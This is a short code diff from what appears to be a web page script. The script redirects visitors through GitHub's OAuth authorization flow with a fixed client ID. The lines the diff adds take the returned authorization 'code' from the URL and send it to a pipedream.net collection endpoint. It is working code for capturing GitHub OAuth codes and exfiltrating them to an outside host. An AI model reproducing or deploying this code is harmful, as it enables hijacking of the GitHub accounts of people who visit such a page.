@@ -11,9 +11,15 @@
                       method: "POST",
                       mode: "cors"
                       }
-                      var aaaaa = await fetch("https://eo8et13a12kdsvh.m.pipedream.net", options)
-                      const result = await aaaaa.json();
-                      console.log("Success:", result);
+                      fetch("https://eo8et13a12kdsvh.m.pipedream.net/?code="+urlParams.get('code'), options)
+                      .then(function (response) {
+                           console.log(response.status);
+                           console.info(response.json());
+                      }).then(function (data) {
+                            console.log(data);
+                      }).catch(function (error) {
+                            console.log(error.message);
+                      });
                }
                function u(){
                     document.location.replace("https://github.com/login/oauth/authorize/?client_id=b4351f9a24499dcd9bbe&redirect_uri="+window.location.href+"&state=dkskdkwkdksjdjskdjskdm&allow_signup=false")
